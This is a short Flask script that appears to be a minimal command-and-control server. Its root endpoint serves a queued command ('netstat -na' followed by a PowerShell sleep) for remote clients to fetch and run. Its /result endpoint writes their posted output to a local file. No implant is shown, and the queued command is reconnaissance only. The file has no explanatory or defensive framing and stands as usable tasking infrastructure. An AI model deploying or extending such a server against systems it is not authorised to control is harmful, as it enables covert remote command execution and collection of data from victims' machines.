from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def command():
    return {"status":"ok", "c":"netstat -na;Start-Sleep -Seconds 5"}

@app.route('/result', methods=['POST'])
def result():
    with open('./result.txt', 'a+') as f:
        f.write(request.form["r"])
        f.write("---")
    return {}